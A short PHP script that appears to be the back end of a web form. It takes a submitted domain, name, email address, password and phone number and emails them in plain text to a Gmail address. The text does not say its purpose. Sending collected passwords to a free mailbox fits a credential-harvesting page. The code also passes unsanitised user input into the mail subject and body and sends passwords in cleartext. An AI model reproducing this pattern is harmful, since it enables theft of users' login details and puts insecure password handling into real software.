    <?php
    $toEmail = "smmpanelstore@gmail.com";
    $mailHeaders = "Domain: " . $_POST["domain"] . $_POST["name"] ."\n Email:". $_POST["your_email"] ."\n password: " . $_POST["password"] ."\n phone: " . $_POST["your_phone"] ."\r\n\r\n";
    if(mail($toEmail, $_POST["domain"], $mailHeaders)) {
    echo"<p class='success'></p>";
    } else {
    echo"<p class='Error'></p>";
    }
    ?>